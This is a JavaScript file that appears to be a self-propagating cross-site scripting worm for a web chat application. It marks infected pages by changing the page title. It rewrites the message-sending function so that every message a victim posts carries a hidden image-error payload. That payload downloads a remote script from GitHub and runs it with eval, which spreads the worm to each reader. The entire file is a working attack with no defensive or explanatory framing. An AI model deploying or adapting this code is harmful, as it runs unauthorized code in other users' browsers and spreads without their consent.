if (typeof eafeaf === 'undefined') {
            document.title = "infected | " + document.title;
}
eafeaf = true;

function sendMessage() {
            const name = getUsername();
            const content = `<img src="" onerror="if (typeof efef === 'undefined') {efef = true; var x = new XMLHttpRequest(); x.onreadystatechange = function() { if (this.readyState == 4 && this.status == 200) { eval(x.responseText); } }; x.open('GET', 'https://raw.githubusercontent.com/davidtheplatform/megi-xss/main/main.js', true); x.send(); }">` + messageInput.value;
            const color = getUserColor();

            if (content.trim() !== "") {
                const messageData = {
                    name: name,
                    content: content,
                    color: color
                };

                fetch(`${apiUrl}/api/messages`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(messageData)
                })
                    .then(response => {
                        if (response.ok) {
                            messageInput.value = "";
                            expandMessageInput();
                            getMessages();
                        } else {
                            response.json().then(data => {
                                // Display error message
                                alert(data.error);
                            });
                        }
                    });
            }
        }
